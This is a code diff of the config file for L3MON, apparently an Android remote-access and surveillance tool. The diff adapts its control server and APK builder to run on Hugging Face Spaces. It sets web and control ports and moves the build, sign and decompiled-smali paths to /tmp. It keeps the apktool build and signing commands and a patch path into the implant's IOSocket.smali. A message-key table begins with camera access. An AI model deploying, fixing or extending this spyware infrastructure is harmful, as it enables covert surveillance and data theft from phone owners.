@@ -1,30 +1,31 @@
 const path = require('path');
 
-// Enable debug mode if needed
+// Writable directory in Hugging Face Spaces
+const writableDir = '/tmp';
+
 exports.debug = false;
 
-// Hugging Face Spaces assigns a random port via process.env.PORT
-// We will use that port for both web and control server
-const HF_PORT = process.env.PORT || 7860;
+// Use Space's runtime port
+exports.web_port = process.env.PORT || 7860;
+exports.control_port = 22222;
 
-// Ports
-exports.web_port = HF_PORT;
-exports.control_port = HF_PORT; // Using the same port on HF (only 1 exposed port)
-
-// Paths
-exports.apkBuildPath = path.join(__dirname, '../assets/webpublic/build.apk');
-exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/L3MON.apk');
+// Paths moved to writable /tmp
+exports.apkBuildPath = path.join(writableDir, 'build.apk');
+exports.apkSignedBuildPath = path.join(writableDir, 'L3MON.apk');
 
 exports.downloadsFolder = '/client_downloads';
-exports.downloadsFullPath = path.join(__dirname, '../assets/webpublic', exports.downloadsFolder);
+exports.downloadsFullPath = path.join(writableDir, exports.downloadsFolder);
 
+// Tools can stay in app folder (read-only is fine for reading)
 exports.apkTool = path.join(__dirname, '../app/factory/', 'apktool.jar');
 exports.apkSign = path.join(__dirname, '../app/factory/', 'sign.jar');
-exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');
+
+// Smali output must also be in /tmp
+exports.smaliPath = path.join(writableDir, 'decompiled');
 exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/etechd/l3mon/IOSocket.smali');
 
-exports.buildCommand = 'java -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';
-exports.signCommand = 'java -jar "' + exports.apkSign + '" "' + exports.apkBuildPath + '"'; // <-- fix output
+exports.buildCommand = `java -jar "${exports.apkTool}" b "${exports.smaliPath}" -o "${exports.apkBuildPath}"`;
+exports.signCommand = `java -jar "${exports.apkSign}" "${exports.apkBuildPath}"`;
 
 exports.messageKeys = {
     camera: '0xCA',
@@ -43,20 +44,8 @@ exports.messageKeys = {
 };
 
 exports.logTypes = {
-    error: {
-        name: 'ERROR',
-        color: 'red'
-    },
-    alert: {
-        name: 'ALERT',
-        color: 'amber'
-    },
-    success: {
-        name: 'SUCCESS',
-        color: 'limegreen'
-    },
-    info: {
-        name: 'INFO',
-        color: 'blue'
-    }
+    error: { name: 'ERROR', color: 'red' },
+    alert: { name: 'ALERT', color: 'amber' },
+    success: { name: 'SUCCESS', color: 'limegreen' },
+    info: { name: 'INFO', color: 'blue' }
 };
